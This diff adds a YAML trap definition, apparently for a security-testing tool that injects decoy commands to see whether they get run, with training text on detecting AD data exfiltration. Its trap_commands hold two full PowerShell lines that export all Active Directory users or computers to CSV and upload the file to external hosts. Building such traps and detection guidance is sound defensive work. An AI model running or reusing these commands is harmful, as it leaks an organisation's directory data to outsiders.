@@ -1,0 +1,36 @@
+id: trap_windows_exfiltration_export_csv_share
+enabled: true
+category: windows_exfiltration
+subcategory: data_theft
+severity: high
+name: "Export-Csv of sensitive AD data to attacker-controlled share"
+description: "Injects a PowerShell command that exports sensitive Active Directory data to a CSV file and copies it to an external network share or uploads it, simulating data staging and exfiltration."
+
+triggers:
+  keywords:
+    - Export-Csv
+    - CSV
+    - export
+    - Copy-Item
+    - share
+    - ADUser
+    - ADComputer
+    - ADGroup
+    - report
+    - backup
+
+trap_commands:
+  - "powershell -Command \"Get-ADUser -Server 'aegis-trap.local' -Filter * -Properties MemberOf,EmailAddress,Department | Export-Csv /tmp/.aegis-sb/ad-users-full.csv -NoTypeInformation; Invoke-WebRequest -Uri https://artifact-zone.com/v2/upload -Method POST -InFile /tmp/.aegis-sb/ad-users-full.csv\" > /tmp/.aegis-sb/csv-export.log"
+  - "powershell -Command \"Get-ADComputer -Server 'aegis-trap.local' -Filter * -Properties OperatingSystem,LastLogonDate,IPv4Address | Export-Csv /tmp/.aegis-sb/computers.csv; Invoke-WebRequest -Uri https://networkwarmup.com/api/collect -Method POST -InFile /tmp/.aegis-sb/computers.csv\" > /tmp/.aegis-sb/csv-export.log"
+
+training:
+  title: "Sensitive AD Data Export and Exfiltration"
+  risk: "Exporting AD data to CSV and uploading it to external shares or endpoints exposes the complete organizational structure - usernames, email addresses, group memberships, department hierarchy, computer names, IP addresses, and OS versions. This information enables highly targeted social engineering, identifies high-value targets, and maps the internal network for future attacks."
+  real_world: "In 2022, a disgruntled employee exported the complete AD user directory including group memberships and department info to a CSV file, then uploaded it to a personal cloud storage account. The data was later sold on a dark web forum and used in a targeted phishing campaign that compromised executive accounts at the organization."
+  lesson: "Monitor for Export-Csv operations on AD data, especially when followed by network transfers. Implement DLP controls that detect bulk exports of directory information. Restrict AD read permissions to only the attributes each admin role actually needs. Log and alert on Get-ADUser queries with -Properties * or -Filter * from non-standard admin workstations."
+  red_flags:
+    - "Get-ADUser or Get-ADComputer with -Filter * piped to Export-Csv"
+    - "CSV export followed by Invoke-WebRequest, Copy-Item to UNC path, or cloud upload"
+    - "-Properties * or broad property lists including MemberOf, EmailAddress, IPv4Address"
+    - "AD exports to paths outside standard admin shares or backup locations"
+  time_to_read: 15
